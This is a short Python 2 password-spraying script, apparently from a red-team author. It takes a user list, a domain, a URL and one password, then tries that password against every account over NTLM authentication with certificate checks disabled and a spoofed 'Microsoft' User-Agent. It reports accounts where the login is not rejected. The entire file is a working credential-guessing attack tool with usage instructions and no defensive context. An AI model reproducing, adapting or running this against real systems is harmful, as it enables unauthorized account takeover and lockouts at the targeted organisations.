import sys
import base64
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_ntlm import HttpNtlmAuth

VERSION = "1.1"

def send_request(username, password, url, domain):

	if domain == "":
		username = "%s" % (username)
		print "Trying user %s" % (username)

	else:
		username = "%s\\%s" % (domain, username)
		print "Trying user %s\\%s" % (domain, username)

        try:
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                req = requests.get(url, auth = HttpNtlmAuth(username, password), headers = {'User-Agent': 'Microsoft'}, verify=False)
                if not req.status_code == 401:
                        print "User %s password is %s" % (username, password)
        except:
                print sys.exc_info()[0]

if __name__ == "__main__":
        print "PasswordSpraying v%s\nWith Love Mr.Un1k0d3r RingZer0 Team\n-----------------------------------\n\n" % VERSION
        if len(sys.argv) < 5:
                print "Usage: %s [user list] [domain] [url] [password]" % sys.argv[0]
                sys.exit(0)

        domain = sys.argv[2]
        url = sys.argv[3]
        password = sys.argv[4]
        print "Spraying password %s against %s using domain %s" % (password, url, domain)
        for email in open(sys.argv[1], "rb").readlines():
                send_request(email.strip(), password, url, domain)
